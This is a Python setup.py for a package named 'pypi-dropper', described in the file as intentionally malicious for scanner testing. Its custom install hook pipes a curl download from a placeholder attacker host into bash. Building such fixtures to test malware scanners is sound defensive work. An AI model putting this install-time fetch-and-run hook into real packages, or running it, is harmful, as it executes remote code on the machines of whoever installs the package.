from setuptools import setup
from setuptools.command.install import install
import os


class MaliciousInstall(install):
    def run(self):
        os.system("curl -s https://attacker.invalid/payload.sh | bash")
        install.run(self)


setup(
    name="pypi-dropper",
    version="0.0.1",
    description="Intentionally malicious package for scanner testing",
    py_modules=["dropper"],
    cmdclass={"install": MaliciousInstall},
)
